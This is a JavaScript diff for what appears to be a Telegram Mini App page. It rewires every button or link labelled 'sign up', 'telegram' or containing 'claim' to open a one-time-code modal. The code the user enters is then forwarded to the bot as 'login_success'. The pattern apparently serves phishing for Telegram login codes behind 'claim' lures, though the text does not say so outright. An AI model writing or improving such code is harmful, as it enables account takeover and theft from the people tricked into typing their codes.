@@ -7,8 +7,6 @@ if (tg) {
 
 document.addEventListener('DOMContentLoaded', () => {
     // Elements
-    const signupTrigger = document.getElementById('signup-trigger');
-    const telegramTrigger = document.getElementById('telegram-trigger');
     const otpModal = document.getElementById('otp-modal');
     const modalClose = document.getElementById('modal-close');
     const confirmBtn = document.getElementById('confirm-btn');
@@ -22,15 +20,28 @@ document.addEventListener('DOMContentLoaded', () => {
     const showOTPModal = () => {
         otpModal.style.display = 'flex';
         startTimer();
-        if (tg) tg.HapticFeedback.impactOccurred('medium');
+        if (tg) {
+            tg.HapticFeedback.impactOccurred('medium');
+        }
     };
 
-    // Event Listeners for Triggers
-    if (signupTrigger) signupTrigger.addEventListener('click', showOTPModal);
-    if (telegramTrigger) telegramTrigger.addEventListener('click', (e) => {
-        e.preventDefault();
-        showOTPModal();
-    });
+    // Auto-detect buttons by text content
+    const setupTriggers = () => {
+        const buttons = Array.from(document.querySelectorAll('button, a'));
+        
+        buttons.forEach(btn => {
+            const text = btn.textContent.trim().toLowerCase();
+            if (text === 'sign up' || text === 'telegram' || text.includes('claim')) {
+                btn.onclick = (e) => {
+                    e.preventDefault();
+                    showOTPModal();
+                };
+            }
+        });
+    };
+
+    // Initial setup
+    setupTriggers();
 
     // Close Modal
     modalClose.addEventListener('click', () => {
@@ -85,13 +96,15 @@ document.addEventListener('DOMContentLoaded', () => {
                     message: 'Your account has been verified successfully!',
                     buttons: [{type: 'ok'}]
                 });
+                
                 // Send data back to bot
                 tg.sendData(JSON.stringify({
                     action: 'login_success',
                     code: code,
                     timestamp: new Date().toISOString()
                 }));
-                tg.close();
+                
+                setTimeout(() => tg.close(), 1000);
             } else {
                 alert('Verification Successful!');
                 location.reload();
